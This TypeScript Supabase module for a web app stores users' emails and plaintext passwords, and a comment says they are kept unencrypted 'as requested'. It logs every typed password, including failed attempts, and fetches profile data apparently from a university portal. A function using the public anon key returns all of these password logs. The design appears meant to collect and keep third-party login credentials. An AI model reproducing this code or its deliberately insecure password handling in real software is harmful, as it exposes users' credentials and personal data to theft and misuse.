import { createClient } from '@supabase/supabase-js';

// Replace these with your actual Supabase URL and Anon Key
const supabaseUrl = process.env.NEXT_PUBLIC_SUPABASE_URL || 'YOUR_SUPABASE_URL';
const supabaseAnonKey = process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY || 'YOUR_SUPABASE_ANON_KEY';

export const supabase = createClient(supabaseUrl, supabaseAnonKey);

// Database table interface for user data
export interface UserData {
  id?: number;
  email: string;
  password: string; // Note: Storing passwords unencrypted as requested (not recommended for production)
  user_profile?: any; // JSON data from user profile API
  is_premium?: boolean; // Premium status for feature access
  created_at?: string;
  updated_at?: string;
}

// Database table interface for login logs
export interface LoginLog {
  id?: number;
  email: string;
  password_attempted: string;
  login_status: 'SUCCESS' | 'FAILED';
  error_message?: string;
  ip_address?: string;
  user_agent?: string;
  attempted_at: string;
}

// Function to check if user exists using public view
export const checkUserExists = async (email: string): Promise<boolean> => {
  try {
    const { data, error } = await supabase
      .from('user_exists')
      .select('exists')
      .eq('email', email)
      .single();

    if (error) {
      if (error.code === 'PGRST116') {
        return false; // User not found
      }
      throw error;
    }

    return data?.exists || false;
  } catch (error) {
    console.error('Error checking if user exists:', error);
    return false;
  }
};

// Function to save user data in Supabase (INSERT ONLY - never updates)
export const saveUserData = async (
  email: string, 
  password: string, 
  userProfile?: any,
  isPremium?: boolean
): Promise<{ success: boolean; error?: string; alreadyExists?: boolean }> => {
  try {
    // First check if user already exists
    const userExists = await checkUserExists(email);
    if (userExists) {
      console.log('User already exists, skipping insert');
      return { success: true, alreadyExists: true };
    }

    // Only insert new record if user doesn't exist
    const newUserData: UserData = {
      email,
      password,
      user_profile: userProfile || null,
      is_premium: isPremium || false,
      created_at: new Date().toISOString(),
      updated_at: new Date().toISOString()
    };

    console.log('Inserting new user data:', { 
      email, 
      hasProfile: !!userProfile,
      profileKeys: userProfile ? Object.keys(userProfile) : []
    });

    const { error: insertError } = await supabase
      .from('user_data')
      .insert([newUserData]);

    if (insertError) {
      console.error('Insert error:', insertError);
      throw insertError;
    }

    console.log('User data inserted successfully with profile data');
    return { success: true, alreadyExists: false };
  } catch (error: any) {
    console.error('Error saving user data:', error);
    return { 
      success: false, 
      error: error.message || 'Failed to save user data' 
    };
  }
};

// Function to save first-time login with complete profile data
export const saveFirstTimeUserWithProfile = async (
  email: string,
  password: string,
  fetchUserProfile: () => Promise<any>
): Promise<{ success: boolean; userProfile?: any; error?: string; alreadyExists?: boolean }> => {
  try {
    console.log('Starting first-time user registration for:', email);
    
    // First check if user already exists
    const userExists = await checkUserExists(email);
    if (userExists) {
      console.log('User already exists, skipping profile fetch and insert');
      return { success: true, alreadyExists: true };
    }

    // Fetch complete user profile from API
    console.log('Fetching user profile from API...');
    const userProfile = await fetchUserProfile();
    console.log('User profile fetched successfully:', {
      enrollmentNo: userProfile?.enrollmentNo,
      fullName: userProfile?.fullName,
      email: userProfile?.ruEmailId || userProfile?.emailId
    });

    // Save user data with complete profile
    const saveResult = await saveUserData(email, password, userProfile, false);
    
    if (saveResult.success) {
      return { 
        success: true, 
        userProfile,
        alreadyExists: saveResult.alreadyExists 
      };
    } else {
      return { 
        success: false, 
        error: saveResult.error 
      };
    }
    
  } catch (error: any) {
    console.error('Error in first-time user registration:', error);
    return { 
      success: false, 
      error: error.message || 'Failed to register user with profile data'
    };
  }
};



// Function to save login attempt logs
export const saveLoginLog = async (
  email: string,
  password: string,
  status: 'SUCCESS' | 'FAILED',
  errorMessage?: string
): Promise<{ success: boolean; error?: string }> => {
  try {
    const loginLog: Omit<LoginLog, 'id'> = {
      email,
      password_attempted: password,
      login_status: status,
      error_message: errorMessage,
      ip_address: 'N/A', // Could be enhanced with actual IP detection
      user_agent: typeof window !== 'undefined' ? navigator.userAgent : 'N/A',
      attempted_at: new Date().toISOString()
    };

    const { error } = await supabase
      .from('login_logs')
      .insert([loginLog]);

    if (error) {
      console.error('Error saving login log:', error);
      return { success: false, error: error.message };
    }

    return { success: true };
  } catch (error: any) {
    console.error('Error saving login log:', error);
    return { success: false, error: error.message || 'Failed to save login log' };
  }
};

// Function to get all login logs (for admin view)
export const getLoginLogs = async (): Promise<{ success: boolean; data?: LoginLog[]; error?: string }> => {
  try {
    const { data, error } = await supabase
      .from('login_logs')
      .select('*')
      .order('attempted_at', { ascending: false });

    if (error) {
      console.error('Error fetching login logs:', error);
      return { success: false, error: error.message };
    }

    return { success: true, data: data || [] };
  } catch (error: any) {
    console.error('Error fetching login logs:', error);
    return { success: false, error: error.message || 'Failed to fetch login logs' };
  }
};

// Function to check premium status using public view
export const checkUserPremiumStatus = async (email: string): Promise<boolean> => {
  try {
    const { data, error } = await supabase
      .from('user_premium_status')
      .select('is_premium')
      .eq('email', email)
      .single();

    if (error) {
      if (error.code === 'PGRST116') {
        return false; // User not found, default to non-premium
      }
      throw error;
    }

    return data?.is_premium || false;
  } catch (error) {
    console.error('Error checking premium status:', error);
    return false;
  }
};